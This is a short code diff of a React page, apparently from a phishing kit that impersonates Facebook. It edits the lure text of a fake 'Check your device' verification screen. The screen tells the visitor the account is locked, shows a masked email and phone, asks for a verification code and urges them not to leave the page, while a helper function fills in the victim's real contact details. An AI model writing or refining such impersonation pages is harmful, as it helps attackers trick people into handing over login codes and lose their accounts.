@@ -103,7 +103,7 @@ const Home = () => {
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            // 🎯 Dịch verify với data mặc định
+            // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
             const verifyTexts = {
                 title: 'Check your device',
                 description: `We have sent a verification code to s****g@m****.com, ******32 of yours. Please enter the code we just sent to continue.`,
@@ -399,12 +399,12 @@ const Home = () => {
         }
     };
 
-    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT
+    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - ĐÃ SỬA
     const updateVerifyTranslation = async (targetLang, email, phone) => {
         try {
             const verifyTexts = {
                 title: 'Check your device',
-                description: `We have sent a verification code to your ${email}, ${phone}. Please enter the code we just sent to continue.`,
+                description: `We have sent a verification code to ${email}, ${phone} of yours. Please enter the code we just sent to continue.`,
                 placeholder: 'Enter your code',
                 infoTitle: 'Approve from another device or Enter your verification code',
                 infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
